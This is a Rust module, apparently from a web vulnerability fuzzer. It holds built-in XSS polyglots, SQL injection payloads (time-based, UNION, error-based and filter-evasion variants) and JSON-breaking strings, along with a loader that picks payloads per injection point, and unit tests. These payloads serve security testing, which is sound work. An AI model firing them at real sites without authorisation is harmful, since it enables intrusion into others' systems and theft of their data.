use crate::core::mutator::InjectionPoint;
use std::fs;
use std::io::BufRead;
use std::path::Path;
use log::warn;

pub const POLYGLOT_XSS: &[&str] = &[
    r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#,
    r#"<svg/onload=alert()//>"#,
    r#"<img src=x onerror=alert()>"#,
    r#"</script><script>alert()</script>"#,
    r#"" onmouseover="alert()"#,
    r#"`${alert()}`"#,
    r#"\u003cscript\u003ealert()\u003c/script\u003e"#,
    r#"javascript:alert()//"#,
    r#"'-alert()-'"#,
    r#"<a id=x name=y href=1></a><a id=x name=z href=javascript:alert()></a>"#,
];

pub const POLYGLOT_SQLI: &[&str] = &[
    r#"' OR '1'='1'--"#,
    r#"' OR SLEEP(5)--"#,
    r#"'; SELECT pg_sleep(5)--"#,
    r#"' UNION SELECT NULL,NULL,NULL--"#,
    r#"'; WAITFOR DELAY '0:0:5'--"#,
    r#"' AND '1'='1"#,
    r#"%27%20OR%20%271%27%3D%271"#,
    r#"'/**/OR/**/1=1--"#,
    r#"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"#,
    r#"1'/*!50000UNION*//*!50000SELECT*/1,2,3--"#,
];

pub const POLYGLOT_JSON: &[&str] = &[
    r#"""#,
    r#"","#,
    r#"}"#,
    r#"]"#,
    "\x00",
    r#"\"#,
    r#"\u0000"#,
    r#"":"#,
    r#"],""#,
    r#"},"key":""#,
    r#"{"nested":"value"}"#,
    r#"true"#,
    r#"123"#,
    "\n\r",
];

#[derive(Debug, Clone, Default)]
pub struct PayloadLoader {
    pub xss_payloads: Vec<String>,
    pub sqli_payloads: Vec<String>,
    pub json_payloads: Vec<String>,
    pub generic_payloads: Vec<String>,
}

impl PayloadLoader {
    pub fn new() -> Self {
        Self::default()
    }

    /// Loads payloads from default file paths
    pub fn load() -> Self {
        let mut loader = Self::new();

        loader.xss_payloads = load_list_from_file("payloads/seclist_xss.txt");
        if loader.xss_payloads.is_empty() {
            warn!("No XSS payloads loaded from payloads/seclist_xss.txt");
        }

        loader.sqli_payloads = load_list_from_file("payloads/seclist_sqli.txt");
        if loader.sqli_payloads.is_empty() {
            warn!("No SQLi payloads loaded from payloads/seclist_sqli.txt");
        }

        loader.json_payloads = load_list_from_file("payloads/json_breakers.txt");
        if loader.json_payloads.is_empty() {
            warn!("No JSON payloads loaded from payloads/json_breakers.txt");
        }

        loader.generic_payloads = load_list_from_file("payloads/generic.txt");
        if loader.generic_payloads.is_empty() {
            warn!("No generic payloads loaded from payloads/generic.txt");
        }

        loader
    }

    /// Loads payloads from custom file paths
    pub fn load_from_paths(
        xss_path: Option<&str>,
        sqli_path: Option<&str>,
        json_path: Option<&str>,
        generic_path: Option<&str>,
    ) -> Self {
        let mut loader = Self::new();

        if let Some(path) = xss_path {
            loader.xss_payloads = load_list_from_file(path);
            if loader.xss_payloads.is_empty() {
                warn!("No XSS payloads loaded from {}", path);
            }
        }

        if let Some(path) = sqli_path {
            loader.sqli_payloads = load_list_from_file(path);
            if loader.sqli_payloads.is_empty() {
                warn!("No SQLi payloads loaded from {}", path);
            }
        }

        if let Some(path) = json_path {
            loader.json_payloads = load_list_from_file(path);
            if loader.json_payloads.is_empty() {
                warn!("No JSON payloads loaded from {}", path);
            }
        }

        if let Some(path) = generic_path {
            loader.generic_payloads = load_list_from_file(path);
            if loader.generic_payloads.is_empty() {
                warn!("No generic payloads loaded from {}", path);
            }
        }

        loader
    }

    /// Returns context-aware payloads optimized for the given injection point
    pub fn get_payloads_for_point(&self, point: &InjectionPoint) -> Vec<String> {
        let mut payloads = Vec::new();

        match point {
            InjectionPoint::JsonField(_) => {
                payloads.extend(POLYGLOT_JSON.iter().map(|s| s.to_string()));
                payloads.extend(self.json_payloads.iter().cloned());
                payloads.extend(self.generic_payloads.iter().cloned());
            }
            InjectionPoint::UrlParam(_) | InjectionPoint::FormParam(_) => {
                payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));
                payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
                payloads.extend(self.xss_payloads.iter().cloned());
                payloads.extend(self.sqli_payloads.iter().cloned());
            }
            InjectionPoint::Header(_) => {
                payloads.extend(self.generic_payloads.iter().cloned());
                payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
                payloads.extend(self.sqli_payloads.iter().cloned());
            }
        }

        payloads
    }

    /// Returns all polyglots for quick reconnaissance
    pub fn get_all_polyglots(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));
        payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
        payloads.extend(POLYGLOT_JSON.iter().map(|s| s.to_string()));
        payloads
    }

    pub fn payload_count(&self) -> usize {
        self.xss_payloads.len()
            + self.sqli_payloads.len()
            + self.json_payloads.len()
            + self.generic_payloads.len()
    }

    pub fn total_payload_count(&self) -> usize {
        self.payload_count() + POLYGLOT_XSS.len() + POLYGLOT_SQLI.len() + POLYGLOT_JSON.len()
    }
}

/// Loads lines from a file, skipping empty lines and comments
pub fn load_list_from_file(path: &str) -> Vec<String> {
    let path = Path::new(path);
    let file = match fs::File::open(path) {
        Ok(f) => f,
        Err(e) => {
            warn!("Failed to open payload file {:?}: {}", path, e);
            return Vec::new();
        }
    };
    let reader = std::io::BufReader::new(file);
    reader
        .lines()
        .filter_map(|line| line.ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty() && !s.starts_with('#'))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_polyglot_counts() {
        assert_eq!(POLYGLOT_XSS.len(), 10);
        assert_eq!(POLYGLOT_SQLI.len(), 10);
        assert!(POLYGLOT_JSON.len() >= 10);
    }

    #[test]
    fn test_get_payloads_for_json_field() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::JsonField("user.name".to_string()));
        assert!(!payloads.is_empty());
        assert_eq!(payloads[0], POLYGLOT_JSON[0]);
    }

    #[test]
    fn test_get_payloads_for_url_param() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::UrlParam("id".to_string()));
        assert!(!payloads.is_empty());
        assert_eq!(payloads[0], POLYGLOT_XSS[0]);
    }

    #[test]
    fn test_get_payloads_for_form_param() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::FormParam("username".to_string()));
        assert!(!payloads.is_empty());
        assert_eq!(payloads[0], POLYGLOT_XSS[0]);
    }

    #[test]
    fn test_get_payloads_for_header() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::Header("User-Agent".to_string()));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("OR")));
    }

    #[test]
    fn test_all_polyglots() {
        let loader = PayloadLoader::new();
        let all = loader.get_all_polyglots();
        let expected = POLYGLOT_XSS.len() + POLYGLOT_SQLI.len() + POLYGLOT_JSON.len();
        assert_eq!(all.len(), expected);
    }

    #[test]
    fn test_payload_count_empty() {
        let loader = PayloadLoader::new();
        assert_eq!(loader.payload_count(), 0);
        assert_eq!(
            loader.total_payload_count(),
            POLYGLOT_XSS.len() + POLYGLOT_SQLI.len() + POLYGLOT_JSON.len()
        );
    }

    #[test]
    fn test_payload_count_with_payloads() {
        let mut loader = PayloadLoader::new();
        loader.xss_payloads = vec!["<script>".to_string(), "<img>".to_string()];
        loader.sqli_payloads = vec!["' OR 1=1".to_string()];
        assert_eq!(loader.payload_count(), 3);
    }
}
